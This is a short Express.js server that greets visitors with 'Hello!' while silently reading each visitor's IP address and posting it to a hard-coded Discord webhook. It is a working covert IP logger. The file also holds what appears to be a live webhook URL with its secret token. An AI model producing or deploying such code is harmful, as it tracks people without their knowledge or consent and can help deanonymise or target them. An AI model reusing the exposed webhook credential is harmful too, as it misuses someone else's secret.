const express = require("express");
const fetch = require("node-fetch");

const app = express();

app.get("/", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  await fetch("https://discord.com/api/webhooks/1474902418302173205/FOchWYW0XF66_UMhCp1F8eKmDuQXcm7XCrRftR854OSRwEgJ8EKnkqlRKbghDmgc1vh-", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `New visitor IP: ${ip}`
    })
  });

  res.send("Hello!");
});

app.listen(3000);
